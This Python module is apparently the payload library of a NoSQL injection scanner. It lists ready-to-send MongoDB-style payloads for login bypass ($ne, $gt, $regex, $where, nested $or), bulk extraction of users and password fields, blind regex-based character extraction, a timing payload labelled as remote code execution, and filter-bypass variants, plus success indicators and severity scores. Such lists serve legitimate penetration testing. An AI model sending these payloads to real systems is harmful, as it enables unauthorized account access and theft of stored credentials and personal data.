"""
nosql_payloads.py — NoSQL injection payload database (Project #46)
"""

# ---- 1. DETECTION ----
# Each payload: {"username": <something>, "password": <something>}
DETECTION_PAYLOADS = {
    "ne_null":   {"username": {"$ne": None}, "password": {"$ne": None}},
    "gt_empty":  {"username": {"$gt": ""},   "password": {"$gt": ""}},
    "regex":     {"username": {"$regex": "^admin"}, "password": {"$ne": None}},
    "where":     {"$where": "1==1"},
    "or_arrays": {"$or": [{"username": "admin"}, {"username": "alice"}]},
}

# ---- 2. AUTH BYPASS ----
AUTH_BYPASS = {
    "ne_null":    {"username": {"$ne": None}, "password": {"$ne": None}},
    "gt_empty":   {"username": {"$gt": ""},   "password": {"$gt": ""}},
    "regex_admin":{"username": {"$regex": "^admin"}, "password": {"$ne": None}},
    "where_true": {"$where": "1==1"},
    "or_true":    {"$or": [{"username": "admin"},
                           {"$or": [{"password": "x"}, {"password": "y"}]}]},
    "not_null":   {"username": {"$not": {"$eq": ""}},
                   "password": {"$not": {"$eq": ""}}},
    "in_list":    {"username": {"$in": ["admin", "alice", "bob"]},
                   "password": {"$ne": None}},
}

# ---- 3. DATA EXTRACTION ----
DATA_EXTRACTION = {
    "all_users": {"$where": "this.username != null"},
    "all_admins": {"role": "admin"},
    "all_mails":  {"email": {"$regex": "@"}},
    "passwords":  {"$where": "this.password != null"},
}

# ---- 4. BLIND NOSQL ----
BLIND_NOSQL = {
    "bool_true":  {"username": {"$regex": "^a"}},
    "bool_false": {"username": {"$regex": "^zzz"}},
}

def regex_prefix(field, prefix):
    """Return a query for boolean-based char extraction."""
    return {field: {"$regex": f"^{prefix}"}}

def regex_length(field, length):
    return {field: {"$regex": f"^.{{{length}}}$"}}

# ---- 5. RCE VIA $where ----
def where_sleep(ms=3000):
    return {"$where": f"function(){{ return sleep({ms}) }}"}

WHERE_TRUE_FN = {"$where": "function(){ return 1==1 }"}

# ---- 6. FILTER BYPASS ----
def bypass_payloads():
    """Return dict technique -> payload dict (sent as JSON body)."""
    return {
        "raw_ne":       {"username": {"$ne": None}, "password": {"$ne": None}},
        "comment":      {"username": {"$ne": None}, "password": {"$ne": None}, "_": "//"},
        "override_or":  {"$or": [{"username": "admin"},
                                 {"password": {"$ne": None}}]},
        "nested_or":    {"$and": [{"$or": [{"username": {"$ne": None}}]},
                                  {"$or": [{"password": {"$ne": None}}]}]},
    }

# ---- 7. INDICATORS ----
INDICATORS = {
    "auth_success": ['"status":"ok"', '"status": "ok"', "Logged in as"],
    "admin_leak":   ['"role":"admin"', '"role": "admin"'],
    "data_found":   ['"count":', '"results":['],
    "error_leak":   ['"error"', "invalid"],
}

# ---- 8. OPERATORS REFERENCE ----
NOSQL_OPERATORS = [
    "$ne", "$eq", "$gt", "$gte", "$lt", "$lte",
    "$in", "$nin", "$regex", "$where", "$or", "$and",
    "$not", "$exists", "$type", "$mod", "$all",
    "$size", "$elemMatch",
]

# ---- 9. RISK SCORING ----
def score(issue_type):
    return {
        "nosql_detected":  "INFO",
        "auth_bypass":     "CRITICAL",
        "data_extraction": "HIGH",
        "blind_nosql":     "HIGH",
        "rce_nosql":       "CRITICAL",
        "filter_bypass":   "MEDIUM",
    }.get(issue_type, "MEDIUM")
